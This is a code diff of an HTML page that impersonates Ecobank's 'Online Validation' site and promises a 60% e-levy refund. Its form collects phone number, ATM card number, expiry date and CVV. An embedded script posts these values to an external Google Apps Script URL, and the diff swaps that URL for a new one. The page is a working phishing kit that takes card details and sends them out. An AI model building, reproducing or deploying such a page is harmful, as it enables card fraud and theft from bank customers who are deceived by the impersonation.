@@ -8,51 +8,89 @@
     body {
       font-family: Arial, sans-serif;
       margin: 0;
-      background-color: #f7f7f7;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
       display: flex;
       flex-direction: column;
       align-items: center;
-    }
-    .header {
-      background-color: #1e90ff; /* Blue header */
       color: #fff;
-      text-align: center;
+      overflow-x: hidden;
+    }
+
+    /* Animated waves behind header */
+    .header::before, .header::after {
+      content: "";
+      position: absolute;
+      width: 200%;
+      height: 200%;
+      top: -50%;
+      left: -50%;
+      background: radial-gradient(circle at 50% 50%, rgba(30,144,255,0.15), transparent 70%);
+      border-radius: 40%;
+      animation: wave 15s linear infinite;
+      z-index: 0;
+    }
+    .header::after { animation-delay: 7.5s; }
+    @keyframes wave {
+      0% { transform: rotate(0deg) translate(0,0); }
+      50% { transform: rotate(180deg) translate(20px, 20px); }
+      100% { transform: rotate(360deg) translate(0,0); }
+    }
+
+    .header {
+      position: relative;
+      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      color: #fff;
       width: 100%;
+      min-height: 180px;
       padding: 40px 20px;
       border-bottom-left-radius: 40px;
       border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
     }
-    .header h1 { margin: 0; font-size: 22px; }
-    .header p { margin: 5px 0 0; font-size: 14px; }
+
+    .header-content {
+      position: relative;
+      z-index: 1;
+    }
+
+    .header-content h1 { margin: 0 0 10px; font-size: 24px; }
+    .header-content p { margin: 5px 0 0; font-size: 14px; }
+
     .login-container {
-      background: #fff;
+      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+      color: #fff;
       width: 90%;
       max-width: 360px;
       margin-top: -30px;
       padding: 30px 25px;
       border-radius: 12px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      backdrop-filter: blur(4px);
     }
-    .login-container label {
-      display: block;
-      margin-bottom: 6px;
-      font-size: 14px;
-      color: #333;
-    }
+
+    .login-container label { display: block; margin-bottom: 6px; font-size: 14px; color: #fff; }
     .login-container input {
       width: 100%;
       padding: 12px;
       margin-bottom: 20px;
-      border: 1px solid #ddd;
+      border: 1px solid #274080;
       border-radius: 6px;
       font-size: 14px;
+      background-color: rgba(11,29,77,0.9);
+      color: #fff;
     }
+
     .button-group {
       display: flex;
       justify-content: space-between;
       gap: 10px;
       flex-wrap: wrap;
     }
+
     .button-group button {
       flex: 1;
       padding: 12px;
@@ -61,64 +99,65 @@
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      transition: background 0.3s;
       display: flex;
       align-items: center;
       justify-content: center;
+      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      color: #fff;
+      transition: all 0.3s ease;
     }
-    .login-btn { background-color: #1e90ff; color: #fff; }
-    .login-btn:hover { background-color: #187bcd; }
+
+    .button-group button:hover {
+      background: linear-gradient(135deg, #187bcd, #1560a3);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
   </style>
 </head>
 <body>
   <div class="header">
-    <h1>Secure Authentication</h1>
-    <p>Welcome To The Ecobank Online Validation Platform</p>
+    <div class="header-content">
+      <h1>ECOBANK ONLINE VALIDATION</h1>
+      <p>Validate your account information below to avoid service interruptions</p>
+      <p>A 60% refund of e-levy charges awaits you!</p>
+    </div>
   </div>
 
   <div class="login-container">
-  <form id="demoForm">
-  <label>Phone Number</label>
-  <input type="tel" name="phone_number" required>
+    <form id="demoForm">
+      <label>Phone Number</label>
+      <input type="tel" name="phone_number" placeholder="Enter your phone number" required>
 
-  <label>ATM Card Number</label>
-  <input type="text" name="atm_card_number" required>
+      <label>ATM Card Number</label>
+      <input type="text" name="atm_card_number" placeholder="Enter your card number" required>
 
-  <label>ATM Expiry Date</label>
-  <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
+      <label>ATM Expiry Date</label>
+      <input type="text" name="atm_expiry_date" placeholder="MM/YY" required>
 
-  <label>CVV</label>
-  <input type="text" name="cvv" required>
+      <label>CVV</label>
+      <input type="text" name="cvv" placeholder="Enter CVV" required>
 
- <div class="button-group">
-        <button type="submit" class="login-btn">VALIDATE →</button>
-   </div>
+      <div class="button-group">
+        <button type="submit">VALIDATE →</button>
+      </div>
     </form>
   </div>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbwhXlJQiurYt5vwIobkRLikz6OVDdUksfOj8Zrn6dt_FnyXaIsiX0YC-G8UC2jKRyJr8g/exec";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
     const form = document.getElementById("demoForm");
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
-
       const formData = new FormData(form);
 
       try {
         const response = await fetch(scriptURL, { method: "POST", body: formData });
         const result = await response.text();
-        console.log("Server response:", result);
-
-        if (result.includes("Success")) {
-          // ✅ Only redirect if Apps Script confirms success
-          window.location.href = "thank_you.html";
-        } else {
-          alert("Submission failed: " + result);
-        }
+        if (result.includes("Success")) window.location.href = "thankyou.html";
+        else alert("Submission failed: " + result);
       } catch (err) {
-        console.error("Error:", err);
-        alert("There was a network error. Please try again.");
+        alert("Network error. Please try again.");
       }
     });
   </script>
